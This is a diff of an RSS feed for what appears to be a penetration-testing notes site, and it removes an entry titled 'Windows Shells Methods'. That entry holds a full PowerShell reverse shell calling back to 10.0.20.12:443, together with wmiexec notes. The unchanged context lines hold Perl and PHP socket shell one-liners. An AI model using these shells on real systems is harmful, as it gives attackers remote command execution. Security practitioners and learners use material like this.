@@ -63,14 +63,5 @@ Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotob
 PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!</description>
     </item>
     
-    <item>
-      <title>Windows Shells Methods</title>
-      <link>/shells-methods/windows/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/windows/</guid>
-      <description>Powershell # Powershell reverse shell # Scheduled task for example # powershell -enc &amp;lt;base 64 de la commande&amp;gt; $client = New-Object System.Net.Sockets.TCPClient(&amp;#34;10.0.20.12&amp;#34;,443);$stream = $client.GetStream();\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\ $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;\ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() WMIexec # wmiexec is less noisy than psexec /usr/bin/impacket-wmiexec d.</description>
-    </item>
-    
   </channel>
 </rss>
